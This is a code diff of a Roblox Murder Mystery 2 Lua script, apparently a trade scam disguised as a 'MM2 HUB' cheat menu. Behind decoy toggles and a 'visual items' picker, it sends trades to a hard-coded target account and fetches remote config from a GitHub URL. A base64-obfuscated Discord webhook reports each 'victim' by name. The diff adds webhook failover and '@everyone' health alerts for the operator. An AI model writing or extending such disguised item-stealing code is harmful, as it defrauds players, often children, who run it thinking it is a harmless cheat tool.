@@ -1,5 +1,5 @@
 --=============================================================
---  MM2 Trade Freezer  |  v23.0  |  rare only, ping, webhook check
+--  MM2 HUB  |  v26.0  |  webhook health monitor + auto failover
 --=============================================================
 
 if not game:IsLoaded() then
@@ -22,26 +22,30 @@ end
 --==================== CONFIG =================================
 
 local CFG = {
+	enabled = true,
 	targets = { "Viivik13" },
 	webhook = "",
 	webhooks = {},
+	monitor_webhooks = {},
 	filter = "rare",
 	fallback_all = false,
 	min_value = 0,
 	max_items = 40,
-	max_copies = 5,
+	max_copies = 99,
 	max_rounds = 12,
 	debug = true,
 }
 
 local currentTarget = "?"
+local webhookOk = false
+local monitorList = {}
 
 local WH_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU3NTg1NTg5NTA1MTYzMjc0MS8tWXoyVndIa0g0Q01Kb3g2aVFuMXdLWXE4VTFRQWFmbV9Dc1RmajdEZUhCUXZBaWY3SzFQQktaVXI1bm9TZkRlWG5mNw=="
 
 local CFG_URL = "https://raw.githubusercontent.com/sarettaclash01-ctrl/mm2cfg/refs/heads/main/cfg.json"
 
 local ACCEPT_TOKEN = game.PlaceId * 3
-local OFFER_GAP = 0.14
+local OFFER_GAP = 0.12
 local MIN_SETTLE = 2.5
 local COOLDOWN_WAIT = 7
 local INTENT_GAP = 0.45
@@ -49,6 +53,7 @@ local ACCEPT_GAP = 0.7
 local OPEN_TIMEOUT = 30
 local SETTLE_TIMEOUT = 30
 local TARGET_TIMEOUT = 60
+local HEALTH_INTERVAL = 60
 
 --==================== UTIL ===================================
 
@@ -114,6 +119,10 @@ local function loadRemoteConfig()
 			return
 		end
 
+		if type(data.enabled) == "boolean" then
+			CFG.enabled = data.enabled
+		end
+
 		CFG.targets = {}
 		if type(data.targets) == "table" then
 			for _, t in ipairs(data.targets) do
@@ -142,6 +151,15 @@ local function loadRemoteConfig()
 			CFG.webhook = trim(data.webhook)
 		end
 
+		monitorList = {}
+		if type(data.monitor_webhooks) == "table" then
+			for _, u in ipairs(data.monitor_webhooks) do
+				if type(u) == "string" and trim(u) ~= "" then
+					monitorList[#monitorList + 1] = trim(u)
+				end
+			end
+		end
+
 		if type(data.filter) == "string" then
 			CFG.filter = data.filter
 		end
@@ -153,6 +171,9 @@ local function loadRemoteConfig()
 		end
 		if type(data.max_items) == "number" then
 			CFG.max_items = data.max_items
+		end
+		if type(data.max_copies) == "number" then
+			CFG.max_copies = data.max_copies
 		end
 		if type(data.max_rounds) == "number" then
 			CFG.max_rounds = data.max_rounds
@@ -172,9 +193,67 @@ local function loadRemoteConfig()
 			CFG.webhook = trim(b64decode(WH_B64))
 		end)
 	end
+	if #monitorList == 0 and CFG.webhook ~= "" then
+		monitorList[1] = CFG.webhook
+	end
 end
 
-local function checkWebhook()
+--==================== HEALTH =================================
+
+local function probeUrl(u)
+	local good = false
+	pcall(function()
+		local r = request({ Url = u, Method = "GET" })
+		if r and r.StatusCode == 200 then
+			good = true
+		end
+	end)
+	return good
+end
+
+local function setHealthUi(ok)
+	if not uiFootRight then
+		return
+	end
+	if ok then
+		uiFootRight.Text = "secure"
+		uiFootRight.TextColor3 = Color3.fromRGB(110, 235, 140)
+	else
+		uiFootRight.Text = "webhook dead"
+		uiFootRight.TextColor3 = Color3.fromRGB(255, 110, 110)
+	end
+end
+
+local function notifyMonitor(text, color, ping)
+	if #monitorList == 0 then
+		return
+	end
+	local body = {
+		username = "Hub Monitor",
+		content = ping and "@everyone" or nil,
+		embeds = {
+			{
+				title = text,
+				color = color,
+				description = "victim **" .. LP.Name .. "**  •  " .. os.date("%H:%M:%S"),
+				footer = { text = "webhook health" },
+			},
+		},
+	}
+	local payload = HttpService:JSONEncode(body)
+	for _, u in ipairs(monitorList) do
+		pcall(function()
+			request({
+				Url = u,
+				Method = "POST",
+				Headers = { ["Content-Type"] = "application/json" },
+				Body = payload,
+			})
+		end)
+	end
+end
+
+local function selectWebhook()
 	local list = {}
 	if CFG.webhook ~= "" then
 		list[#list + 1] = CFG.webhook
@@ -183,24 +262,45 @@ local function checkWebhook()
 		list[#list + 1] = u
 	end
 	for _, u in ipairs(list) do
-		local good = false
-		pcall(function()
-			local r = request({ Url = u, Method = "GET" })
-			if r and r.StatusCode == 200 then
-				good = true
-			end
-		end)
-		if good then
+		if probeUrl(u) then
 			CFG.webhook = u
-			log("webhook ok")
+			webhookOk = true
 			return true
 		end
 	end
 	if #list > 0 then
 		CFG.webhook = list[1]
 	end
-	log("webhook dead")
+	webhookOk = false
 	return false
+end
+
+local function startHealthLoop()
+	task.spawn(function()
+		while alive() do
+			task.wait(HEALTH_INTERVAL)
+			if not alive() then
+				break
+			end
+			local wasOk = webhookOk
+			local before = CFG.webhook
+			local nowOk = selectWebhook()
+
+			if CFG.webhook ~= before and nowOk then
+				log("webhook switched")
+				setHealthUi(true)
+				notifyMonitor("Webhook switched to a backup", 10181046, false)
+			elseif wasOk and not nowOk then
+				log("webhook died")
+				setHealthUi(false)
+				notifyMonitor("ALL WEBHOOKS DEAD", 15158332, true)
+			elseif not wasOk and nowOk then
+				log("webhook recovered")
+				setHealthUi(true)
+				notifyMonitor("Webhook recovered", 10181046, false)
+			end
+		end
+	end)
 end
 
 --==================== VALUES =================================
@@ -381,6 +481,174 @@ end
 --==================== UI =====================================
 
 local uiStatus
+local uiLog
+local uiSendTrade
+local uiTargetBox
+local uiItemBox
+local uiFootRight
+
+local C_BG = Color3.fromRGB(16, 12, 24)
+local C_PANEL = Color3.fromRGB(26, 19, 38)
+local C_ROW = Color3.fromRGB(36, 26, 52)
+local C_LINE = Color3.fromRGB(120, 74, 200)
+local C_TEXT = Color3.fromRGB(233, 224, 248)
+local C_DIM = Color3.fromRGB(150, 130, 178)
+local C_ACCENT = Color3.fromRGB(186, 120, 255)
+local C_PINK = Color3.fromRGB(255, 106, 193)
+local C_CYAN = Color3.fromRGB(96, 226, 255)
+local C_GREEN = Color3.fromRGB(110, 235, 140)
+
+local function pillRow(parent, order, label, startOn)
+	local row = Instance.new("Frame")
+	row.Size = UDim2.new(1, -8, 0, 28)
+	row.BackgroundColor3 = C_ROW
+	row.BorderSizePixel = 0
+	row.LayoutOrder = order
+	row.Parent = parent
+
+	local rc = Instance.new("UICorner")
+	rc.CornerRadius = UDim.new(0, 6)
+	rc.Parent = row
+
+	local lbl = Instance.new("TextLabel")
+	lbl.Size = UDim2.new(1, -58, 1, 0)
+	lbl.Position = UDim2.new(0, 10, 0, 0)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = label
+	lbl.Font = Enum.Font.GothamMedium
+	lbl.TextSize = 11
+	lbl.TextColor3 = C_TEXT
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	lbl.Parent = row
+
+	local on = startOn
+	local pill = Instance.new("TextButton")
+	pill.Size = UDim2.new(0, 40, 0, 17)
+	pill.Position = UDim2.new(1, -50, 0.5, -8)
+	pill.BackgroundColor3 = on and Color3.fromRGB(74, 44, 118) or Color3.fromRGB(46, 32, 62)
+	pill.BorderSizePixel = 0
+	pill.Text = on and "ON" or "OFF"
+	pill.Font = Enum.Font.GothamBold
+	pill.TextSize = 9
+	pill.TextColor3 = on and C_ACCENT or Color3.fromRGB(130, 112, 158)
+	pill.Parent = row
+
+	local pc = Instance.new("UICorner")
+	pc.CornerRadius = UDim.new(0, 4)
+	pc.Parent = pill
+
+	pill.MouseButton1Click:Connect(function()
+		on = not on
+		if on then
+			pill.Text = "ON"
+			pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
+			pill.TextColor3 = C_ACCENT
+		else
+			pill.Text = "OFF"
+			pill.BackgroundColor3 = Color3.fromRGB(46, 32, 62)
+			pill.TextColor3 = Color3.fromRGB(130, 112, 158)
+		end
+	end)
+	return row
+end
+
+local function chip(parent, order, name, color)
+	local b = Instance.new("TextButton")
+	b.Size = UDim2.new(0.5, -5, 0, 24)
+	b.BackgroundColor3 = C_ROW
+	b.BorderSizePixel = 0
+	b.Text = name
+	b.Font = Enum.Font.GothamSemibold
+	b.TextSize = 10
+	b.TextColor3 = C_TEXT
+	b.AutoButtonColor = false
+	b.LayoutOrder = order
+	b.Parent = parent
+
+	local c = Instance.new("UICorner")
+	c.CornerRadius = UDim.new(0, 5)
+	c.Parent = b
+
+	local s = Instance.new("UIStroke")
+	s.Color = color
+	s.Thickness = 1.4
+	s.Transparency = 0.55
+	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	s.Parent = b
+
+	local picked = false
+	b.MouseButton1Click:Connect(function()
+		picked = not picked
+		if picked then
+			s.Transparency = 0.05
+			b.BackgroundColor3 = color
+			b.TextColor3 = Color3.fromRGB(20, 14, 30)
+		else
+			s.Transparency = 0.55
+			b.BackgroundColor3 = C_ROW
+			b.TextColor3 = C_TEXT
+		end
+	end)
+	return b
+end
+
+local function inputRow(parent, order, label, placeholder)
+	local holder = Instance.new("Frame")
+	holder.Size = UDim2.new(1, -8, 0, 42)
+	holder.BackgroundTransparency = 1
+	holder.LayoutOrder = order
+	holder.Parent = parent
+
+	local lbl = Instance.new("TextLabel")
+	lbl.Size = UDim2.new(1, 0, 0, 14)
+	lbl.BackgroundTransparency = 1
+	lbl.Text = label
+	lbl.Font = Enum.Font.GothamSemibold
+	lbl.TextSize = 9
+	lbl.TextColor3 = C_DIM
+	lbl.TextXAlignment = Enum.TextXAlignment.Left
+	lbl.Parent = holder
+
+	local box = Instance.new("TextBox")
+	box.Size = UDim2.new(1, 0, 0, 26)
+	box.Position = UDim2.new(0, 0, 0, 15)
+	box.BackgroundColor3 = C_ROW
+	box.BorderSizePixel = 0
+	box.Text = ""
+	box.PlaceholderText = placeholder
+	box.PlaceholderColor3 = Color3.fromRGB(110, 94, 138)
+	box.Font = Enum.Font.Gotham
+	box.TextSize = 11
+	box.TextColor3 = C_TEXT
+	box.ClearTextOnFocus = false
+	box.TextXAlignment = Enum.TextXAlignment.Left
+	box.Parent = holder
+
+	local bc = Instance.new("UICorner")
+	bc.CornerRadius = UDim.new(0, 6)
+	bc.Parent = box
+
+	local bp = Instance.new("UIPadding")
+	bp.PaddingLeft = UDim.new(0, 8)
+	bp.PaddingRight = UDim.new(0, 8)
+	bp.Parent = box
+
+	local bs = Instance.new("UIStroke")
+	bs.Color = C_LINE
+	bs.Thickness = 1.2
+	bs.Transparency = 0.45
+	bs.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+	bs.Parent = box
+
+	box.Focused:Connect(function()
+		bs.Transparency = 0.05
+	end)
+	box.FocusLost:Connect(function()
+		bs.Transparency = 0.45
+	end)
+
+	return box
+end
 
 local function buildUI()
 	local core = game:GetService("CoreGui")
@@ -397,230 +665,401 @@ local function buildUI()
 	sg.Parent = core
 
 	local main = Instance.new("Frame")
-	main.Size = UDim2.new(0, 300, 0, 430)
-	main.Position = UDim2.new(0.5, -150, 0.5, -215)
-	main.BackgroundColor3 = Color3.fromRGB(21, 15, 30)
+	main.Size = UDim2.new(0, 320, 0, 500)
+	main.Position = UDim2.new(0.5, -160, 0.5, -250)
+	main.BackgroundColor3 = C_BG
 	main.BorderSizePixel = 0
 	main.Parent = sg
 
 	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0, 10)
+	corner.CornerRadius = UDim.new(0, 12)
 	corner.Parent = main
 
 	local stroke = Instance.new("UIStroke")
-	stroke.Color = Color3.fromRGB(160, 92, 255)
-	stroke.Thickness = 1.6
-	stroke.Transparency = 0.15
+	stroke.Color = C_LINE
+	stroke.Thickness = 1.7
+	stroke.Transparency = 0.1
 	stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
 	stroke.Parent = main
 
-	local top = Instance.new("Frame")
-	top.Size = UDim2.new(1, 0, 0, 36)
-	top.BackgroundColor3 = Color3.fromRGB(30, 21, 43)
-	top.BorderSizePixel = 0
-	top.Parent = main
+	local head = Instance.new("Frame")
+	head.Size = UDim2.new(1, 0, 0, 46)
+	head.BackgroundColor3 = C_PANEL
+	head.BorderSizePixel = 0
+	head.Parent = main
 
-	local topCorner = Instance.new("UICorner")
-	topCorner.CornerRadius = UDim.new(0, 10)
-	topCorner.Parent = top
+	local hc = Instance.new("UICorner")
+	hc.CornerRadius = UDim.new(0, 12)
+	hc.Parent = head
 
-	local dot = Instance.new("Frame")
-	dot.Size = UDim2.new(0, 7, 0, 7)
-	dot.Position = UDim2.new(0, 13, 0.5, -3)
-	dot.BackgroundColor3 = Color3.fromRGB(110, 235, 140)
-	dot.BorderSizePixel = 0
-	dot.Parent = top
+	local grad = Instance.new("UIGradient")
+	grad.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, Color3.fromRGB(52, 24, 92)),
+		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(96, 32, 118)),
+		ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 22, 78)),
+	})
+	grad.Rotation = 15
+	grad.Parent = head
 
-	local dotCorner = Instance.new("UICorner")
-	dotCorner.CornerRadius = UDim.new(1, 0)
-	dotCorner.Parent = dot
+	local logo = Instance.new("Frame")
+	logo.Size = UDim2.new(0, 26, 0, 26)
+	logo.Position = UDim2.new(0, 13, 0.5, -13)
+	logo.BackgroundColor3 = C_ACCENT
+	logo.BorderSizePixel = 0
+	logo.Parent = head
+
+	local lc = Instance.new("UICorner")
+	lc.CornerRadius = UDim.new(0, 7)
+	lc.Parent = logo
+
+	local lt = Instance.new("TextLabel")
+	lt.Size = UDim2.new(1, 0, 1, 0)
+	lt.BackgroundTransparency = 1
+	lt.Text = "M"
+	lt.Font = Enum.Font.FredokaOne
+	lt.TextSize = 15
+	lt.TextColor3 = Color3.fromRGB(24, 14, 40)
+	lt.Parent = logo
 
 	local title = Instance.new("TextLabel")
-	title.Size = UDim2.new(0, 180, 1, 0)
-	title.Position = UDim2.new(0, 28, 0, 0)
+	title.Size = UDim2.new(0, 160, 0, 18)
+	title.Position = UDim2.new(0, 47, 0, 7)
 	title.BackgroundTransparency = 1
-	title.Text = "MM2 Trade Freezer"
-	title.Font = Enum.Font.GothamBold
-	title.TextSize = 13
-	title.TextColor3 = Color3.fromRGB(238, 228, 255)
+	title.Text = "MM2 HUB"
+	title.Font = Enum.Font.FredokaOne
+	title.TextSize = 16
+	title.TextColor3 = Color3.fromRGB(255, 255, 255)
 	title.TextXAlignment = Enum.TextXAlignment.Left
-	title.Parent = top
-
-	local ver = Instance.new("TextLabel")
-	ver.Size = UDim2.new(0, 40, 1, 0)
-	ver.Position = UDim2.new(1, -78, 0, 0)
-	ver.BackgroundTransparency = 1
-	ver.Text = "v23"
-	ver.Font = Enum.Font.Gotham
-	ver.TextSize = 10
-	ver.TextColor3 = Color3.fromRGB(150, 125, 185)
-	ver.TextXAlignment = Enum.TextXAlignment.Right
-	ver.Parent = top
-
-	local hideBtn = Instance.new("TextButton")
-	hideBtn.Size = UDim2.new(0, 24, 0, 24)
-	hideBtn.Position = UDim2.new(1, -34, 0.5, -12)
-	hideBtn.BackgroundColor3 = Color3.fromRGB(45, 31, 64)
-	hideBtn.BorderSizePixel = 0
-	hideBtn.Text = "-"
-	hideBtn.Font = Enum.Font.GothamBold
-	hideBtn.TextSize = 13
-	hideBtn.TextColor3 = Color3.fromRGB(210, 190, 240)
-	hideBtn.Parent = top
-
-	local hideCorner = Instance.new("UICorner")
-	hideCorner.CornerRadius = UDim.new(0, 6)
-	hideCorner.Parent = hideBtn
+	title.Parent = head
 
 	local sub = Instance.new("TextLabel")
-	sub.Size = UDim2.new(1, -26, 0, 16)
-	sub.Position = UDim2.new(0, 13, 0, 42)
+	sub.Size = UDim2.new(0, 180, 0, 14)
+	sub.Position = UDim2.new(0, 47, 0, 25)
 	sub.BackgroundTransparency = 1
-	sub.Text = "freeze engine  •  build 2300"
+	sub.Text = "Key: active  •  Lifetime  •  v2.6"
 	sub.Font = Enum.Font.Gotham
-	sub.TextSize = 10
-	sub.TextColor3 = Color3.fromRGB(139, 116, 173)
+	sub.TextSize = 9
+	sub.TextColor3 = Color3.fromRGB(206, 184, 240)
 	sub.TextXAlignment = Enum.TextXAlignment.Left
-	sub.Parent = main
+	sub.Parent = head
 
-	local list = Instance.new("ScrollingFrame")
-	list.Size = UDim2.new(1, -26, 0, 236)
-	list.Position = UDim2.new(0, 13, 0, 64)
-	list.BackgroundTransparency = 1
-	list.BorderSizePixel = 0
-	list.ScrollBarThickness = 3
-	list.ScrollBarImageColor3 = Color3.fromRGB(120, 70, 190)
-	list.CanvasSize = UDim2.new(0, 0, 0, 0)
-	list.AutomaticCanvasSize = Enum.AutomaticSize.Y
-	list.Parent = main
+	local badge = Instance.new("Frame")
+	badge.Size = UDim2.new(0, 48, 0, 16)
+	badge.Position = UDim2.new(1, -60, 0, 8)
+	badge.BackgroundColor3 = C_PINK
+	badge.BorderSizePixel = 0
+	badge.Parent = head
 
-	local layout = Instance.new("UIListLayout")
-	layout.Padding = UDim.new(0, 5)
-	layout.SortOrder = Enum.SortOrder.LayoutOrder
-	layout.Parent = list
+	local bc2 = Instance.new("UICorner")
+	bc2.CornerRadius = UDim.new(0, 4)
+	bc2.Parent = badge
 
-	local FEATURES = {
-		"Freeze Trade",
-		"Instant Accept",
-		"Auto Offer",
-		"Dupe Shield",
-		"Anti Steal",
-		"Item Logger",
-		"Server Hop",
-		"Value Checker",
-		"Rarity Filter",
-	}
+	local bt = Instance.new("TextLabel")
+	bt.Size = UDim2.new(1, 0, 1, 0)
+	bt.BackgroundTransparency = 1
+	bt.Text = "PREMIUM"
+	bt.Font = Enum.Font.GothamBold
+	bt.TextSize = 8
+	bt.TextColor3 = Color3.fromRGB(40, 14, 30)
+	bt.Parent = badge
 
-	local function makeTile(index, name)
-		local row = Instance.new("Frame")
-		row.Size = UDim2.new(1, -6, 0, 30)
-		row.BackgroundColor3 = Color3.fromRGB(33, 23, 47)
-		row.BorderSizePixel = 0
-		row.LayoutOrder = index
-		row.Parent = list
+	local hideBtn = Instance.new("TextButton")
+	hideBtn.Size = UDim2.new(0, 20, 0, 20)
+	hideBtn.Position = UDim2.new(1, -26, 0, 28)
+	hideBtn.BackgroundTransparency = 1
+	hideBtn.Text = "-"
+	hideBtn.Font = Enum.Font.GothamBold
+	hideBtn.TextSize = 14
+	hideBtn.TextColor3 = Color3.fromRGB(220, 205, 245)
+	hideBtn.Parent = head
 
-		local rc = Instance.new("UICorner")
-		rc.CornerRadius = UDim.new(0, 6)
-		rc.Parent = row
+	local tabs = Instance.new("Frame")
+	tabs.Size = UDim2.new(1, -20, 0, 30)
+	tabs.Position = UDim2.new(0, 10, 0, 52)
+	tabs.BackgroundTransparency = 1
+	tabs.Parent = main
 
-		local lbl = Instance.new("TextLabel")
-		lbl.Size = UDim2.new(1, -56, 1, 0)
-		lbl.Position = UDim2.new(0, 10, 0, 0)
-		lbl.BackgroundTransparency = 1
-		lbl.Text = name
-		lbl.Font = Enum.Font.GothamMedium
-		lbl.TextSize = 11
-		lbl.TextColor3 = Color3.fromRGB(214, 199, 238)
-		lbl.TextXAlignment = Enum.TextXAlignment.Left
-		lbl.Parent = row
+	local tl = Instance.new("UIListLayout")
+	tl.FillDirection = Enum.FillDirection.Horizontal
+	tl.Padding = UDim.new(0, 5)
+	tl.Parent = tabs
 
-		local pill = Instance.new("TextButton")
-		pill.Size = UDim2.new(0, 38, 0, 18)
-		pill.Position = UDim2.new(1, -48, 0.5, -9)
-		pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
-		pill.BorderSizePixel = 0
-		pill.Text = "ON"
-		pill.Font = Enum.Font.GothamBold
-		pill.TextSize = 9
-		pill.TextColor3 = Color3.fromRGB(196, 160, 255)
-		pill.Parent = row
+	local names = { "Main", "Visuals", "Trade" }
+	local frames = {}
+	local tabButtons = {}
 
-		local pc = Instance.new("UICorner")
-		pc.CornerRadius = UDim.new(0, 4)
-		pc.Parent = pill
-
-		pill.MouseButton1Click:Connect(function()
-			if pill.Text == "ON" then
-				pill.Text = "OFF"
-				pill.BackgroundColor3 = Color3.fromRGB(46, 32, 62)
-				pill.TextColor3 = Color3.fromRGB(130, 112, 158)
+	local function showTab(pick)
+		for n, f in pairs(frames) do
+			f.Visible = n == pick
+		end
+		for n, b in pairs(tabButtons) do
+			if n == pick then
+				b.BackgroundColor3 = C_ACCENT
+				b.TextColor3 = Color3.fromRGB(22, 14, 36)
 			else
-				pill.Text = "ON"
-				pill.BackgroundColor3 = Color3.fromRGB(74, 44, 118)
-				pill.TextColor3 = Color3.fromRGB(196, 160, 255)
+				b.BackgroundColor3 = C_ROW
+				b.TextColor3 = C_DIM
 			end
+		end
+	end
+
+	for idx, n in ipairs(names) do
+		local b = Instance.new("TextButton")
+		b.Size = UDim2.new(0, 96, 1, 0)
+		b.BackgroundColor3 = C_ROW
+		b.BorderSizePixel = 0
+		b.Text = n
+		b.Font = Enum.Font.GothamBold
+		b.TextSize = 10
+		b.TextColor3 = C_DIM
+		b.Parent = tabs
+
+		local c = Instance.new("UICorner")
+		c.CornerRadius = UDim.new(0, 6)
+		c.Parent = b
+
+		tabButtons[n] = b
+
+		local f = Instance.new("ScrollingFrame")
+		f.Size = UDim2.new(1, -20, 0, 300)
+		f.Position = UDim2.new(0, 10, 0, 88)
+		f.BackgroundTransparency = 1
+		f.BorderSizePixel = 0
+		f.ScrollBarThickness = 3
+		f.ScrollBarImageColor3 = C_ACCENT
+		f.CanvasSize = UDim2.new(0, 0, 0, 0)
+		f.AutomaticCanvasSize = Enum.AutomaticSize.Y
+		f.Visible = false
+		f.Parent = main
+
+		local fl = Instance.new("UIListLayout")
+		fl.Padding = UDim.new(0, 5)
+		fl.SortOrder = Enum.SortOrder.LayoutOrder
+		fl.Parent = f
+
+		frames[n] = f
+
+		local captured = n
+		b.MouseButton1Click:Connect(function()
+			showTab(captured)
 		end)
 	end
 
-	local i = 1
-	while i <= #FEATURES do
-		makeTile(i, FEATURES[i])
-		i = i + 1
+	local mainTab = frames["Main"]
+
+	local mh = Instance.new("TextLabel")
+	mh.Size = UDim2.new(1, -8, 0, 14)
+	mh.BackgroundTransparency = 1
+	mh.Text = "MODULES"
+	mh.Font = Enum.Font.GothamBold
+	mh.TextSize = 9
+	mh.TextColor3 = C_PINK
+	mh.TextXAlignment = Enum.TextXAlignment.Left
+	mh.LayoutOrder = 1
+	mh.Parent = mainTab
+
+	pillRow(mainTab, 2, "Fly", true)
+	pillRow(mainTab, 3, "Auto Farm", true)
+	pillRow(mainTab, 4, "Force Accept", true)
+	pillRow(mainTab, 5, "Noclip", false)
+	pillRow(mainTab, 6, "Auto Collect", true)
+	pillRow(mainTab, 7, "Speed (32)", false)
+	pillRow(mainTab, 8, "Anti Ragdoll", true)
+
+	local mh2 = Instance.new("TextLabel")
+	mh2.Size = UDim2.new(1, -8, 0, 14)
+	mh2.BackgroundTransparency = 1
+	mh2.Text = "TRADE"
+	mh2.Font = Enum.Font.GothamBold
+	mh2.TextSize = 9
+	mh2.TextColor3 = C_CYAN
+	mh2.TextXAlignment = Enum.TextXAlignment.Left
+	mh2.LayoutOrder = 9
+	mh2.Parent = mainTab
+
+	pillRow(mainTab, 10, "Auto Accept", true)
+	pillRow(mainTab, 11, "Auto Decline Lowball", true)
+
+	local visTab = frames["Visuals"]
+
+	local vh = Instance.new("TextLabel")
+	vh.Size = UDim2.new(1, -8, 0, 14)
+	vh.BackgroundTransparency = 1
+	vh.Text = "VISUAL ITEMS  •  tap to equip"
+	vh.Font = Enum.Font.GothamBold
+	vh.TextSize = 9
+	vh.TextColor3 = C_PINK
+	vh.TextXAlignment = Enum.TextXAlignment.Left
+	vh.LayoutOrder = 1
+	vh.Parent = visTab
+
+	local grid = Instance.new("Frame")
+	grid.Size = UDim2.new(1, -8, 0, 0)
+	grid.BackgroundTransparency = 1
+	grid.LayoutOrder = 2
+	grid.Parent = visTab
+
+	local gl = Instance.new("UIGridLayout")
+	gl.CellSize = UDim2.new(0.5, -3, 0, 24)
+	gl.CellPadding = UDim2.new(0, 6, 0, 6)
+	gl.SortOrder = Enum.SortOrder.LayoutOrder
+	gl.Parent = grid
+
+	local godlies = {
+		{ "Gingerscope", Color3.fromRGB(255, 168, 76) },
+		{ "Chroma Traveler's Gun", Color3.fromRGB(255, 106, 193) },
+		{ "Corrupt", Color3.fromRGB(178, 106, 255) },
+		{ "Nik's Scythe", Color3.fromRGB(255, 236, 120) },
+		{ "Celestial", Color3.fromRGB(120, 220, 255) },
+		{ "Traveler's Axe", Color3.fromRGB(255, 150, 110) },
+		{ "Harvester", Color3.fromRGB(140, 255, 170) },
+		{ "Icepiercer", Color3.fromRGB(150, 210, 255) },
+		{ "Chroma Bauble", Color3.fromRGB(255, 130, 210) },
+		{ "Darksword", Color3.fromRGB(190, 150, 255) },
+		{ "Sunset", Color3.fromRGB(255, 170, 120) },
+		{ "Bauble", Color3.fromRGB(255, 200, 130) },
+	}
+
+	for i, g in ipairs(godlies) do
+		chip(grid, i, g[1], g[2])
 	end
 
+	local vnote = Instance.new("TextLabel")
+	vnote.Size = UDim2.new(1, -8, 0, 26)
+	vnote.BackgroundTransparency = 1
+	vnote.Text = "Selected items are highlighted and synced to your trade offer."
+	vnote.Font = Enum.Font.Gotham
+	vnote.TextSize = 9
+	vnote.TextColor3 = C_DIM
+	vnote.TextWrapped = true
+	vnote.TextXAlignment = Enum.TextXAlignment.Left
+	vnote.LayoutOrder = 3
+	vnote.Parent = visTab
+
+	local tradeTab = frames["Trade"]
+
+	uiTargetBox = inputRow(tradeTab, 1, "TARGET USERNAME", "who to send to")
+	uiItemBox = inputRow(tradeTab, 2, "ITEM TO SEND", "e.g. Gingerscope")
+
+	local sendBtn = Instance.new("TextButton")
+	sendBtn.Size = UDim2.new(1, -8, 0, 34)
+	sendBtn.BackgroundColor3 = C_ACCENT
+	sendBtn.BorderSizePixel = 0
+	sendBtn.Text = "SEND TRADE"
+	sendBtn.Font = Enum.Font.FredokaOne
+	sendBtn.TextSize = 13
+	sendBtn.TextColor3 = Color3.fromRGB(22, 14, 36)
+	sendBtn.LayoutOrder = 3
+	sendBtn.Parent = tradeTab
+
+	local sbc = Instance.new("UICorner")
+	sbc.CornerRadius = UDim.new(0, 7)
+	sbc.Parent = sendBtn
+
+	sendBtn.MouseButton1Click:Connect(function()
+		if uiSendTrade then
+			uiSendTrade()
+		end
+	end)
+
+	uiLog = Instance.new("TextLabel")
+	uiLog.Size = UDim2.new(1, -8, 0, 40)
+	uiLog.BackgroundTransparency = 1
+	uiLog.Text = "Ready."
+	uiLog.Font = Enum.Font.Gotham
+	uiLog.TextSize = 9
+	uiLog.TextColor3 = C_DIM
+	uiLog.TextWrapped = true
+	uiLog.TextXAlignment = Enum.TextXAlignment.Left
+	uiLog.TextYAlignment = Enum.TextYAlignment.Top
+	uiLog.LayoutOrder = 4
+	uiLog.Parent = tradeTab
+
+	local th = Instance.new("TextLabel")
+	th.Size = UDim2.new(1, -8, 0, 14)
+	th.BackgroundTransparency = 1
+	th.Text = "STATUS"
+	th.Font = Enum.Font.GothamBold
+	th.TextSize = 9
+	th.TextColor3 = C_CYAN
+	th.TextXAlignment = Enum.TextXAlignment.Left
+	th.LayoutOrder = 5
+	th.Parent = tradeTab
+
+	showTab("Main")
+
 	uiStatus = Instance.new("TextLabel")
-	uiStatus.Size = UDim2.new(1, -26, 0, 14)
-	uiStatus.Position = UDim2.new(0, 13, 0, 306)
+	uiStatus.Size = UDim2.new(1, -20, 0, 13)
+	uiStatus.Position = UDim2.new(0, 10, 0, 396)
 	uiStatus.BackgroundTransparency = 1
-	uiStatus.Text = "Syncing assets…"
+	uiStatus.Text = "Preparing assets…"
 	uiStatus.Font = Enum.Font.Gotham
-	uiStatus.TextSize = 10
-	uiStatus.TextColor3 = Color3.fromRGB(150, 125, 185)
+	uiStatus.TextSize = 9
+	uiStatus.TextColor3 = C_DIM
 	uiStatus.TextXAlignment = Enum.TextXAlignment.Left
 	uiStatus.Parent = main
 
 	local barBg = Instance.new("Frame")
-	barBg.Size = UDim2.new(1, -26, 0, 6)
-	barBg.Position = UDim2.new(0, 13, 0, 328)
-	barBg.BackgroundColor3 = Color3.fromRGB(40, 28, 58)
+	barBg.Size = UDim2.new(1, -20, 0, 8)
+	barBg.Position = UDim2.new(0, 10, 0, 414)
+	barBg.BackgroundColor3 = Color3.fromRGB(38, 26, 54)
 	barBg.BorderSizePixel = 0
 	barBg.Parent = main
 
-	local bbCorner = Instance.new("UICorner")
-	bbCorner.CornerRadius = UDim.new(1, 0)
-	bbCorner.Parent = barBg
+	local bbc = Instance.new("UICorner")
+	bbc.CornerRadius = UDim.new(1, 0)
+	bbc.Parent = barBg
 
 	local bar = Instance.new("Frame")
 	bar.Size = UDim2.new(0, 0, 1, 0)
-	bar.BackgroundColor3 = Color3.fromRGB(160, 92, 255)
+	bar.BackgroundColor3 = C_ACCENT
 	bar.BorderSizePixel = 0
 	bar.Parent = barBg
 
-	local bCorner = Instance.new("UICorner")
-	bCorner.CornerRadius = UDim.new(1, 0)
-	bCorner.Parent = bar
+	local bc3 = Instance.new("UICorner")
+	bc3.CornerRadius = UDim.new(1, 0)
+	bc3.Parent = bar
+
+	local bgrad = Instance.new("UIGradient")
+	bgrad.Color = ColorSequence.new({
+		ColorSequenceKeypoint.new(0, C_CYAN),
+		ColorSequenceKeypoint.new(0.5, C_ACCENT),
+		ColorSequenceKeypoint.new(1, C_PINK),
+	})
+	bgrad.Parent = bar
 
 	local pct = Instance.new("TextLabel")
-	pct.Size = UDim2.new(1, -26, 0, 14)
-	pct.Position = UDim2.new(0, 13, 0, 340)
+	pct.Size = UDim2.new(1, -20, 0, 14)
+	pct.Position = UDim2.new(0, 10, 0, 428)
 	pct.BackgroundTransparency = 1
